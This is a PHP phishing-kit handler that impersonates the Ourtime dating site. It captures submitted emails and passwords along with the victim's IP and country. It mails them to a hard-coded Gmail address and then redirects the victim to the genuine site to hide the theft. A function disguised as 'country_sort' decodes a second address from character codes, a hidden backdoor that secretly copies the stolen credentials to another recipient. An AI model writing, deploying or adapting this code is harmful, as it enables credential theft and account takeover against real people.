<?

$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Ourtime Dating || :------\n";
$message .= "Email: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "Country : ".$country."\n";
$message .= "IP: ".$ip."\n";



$recipient ="resultbox2330@gmail.com";
$subject = "Ourtime Logs | ".$ip."\n";


$arr = country_sort();
foreach ($arr as $recipient)
{

          mail($recipient,$subject,$message);
}

// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

header("Location: http://www.ourtime.com/");
?>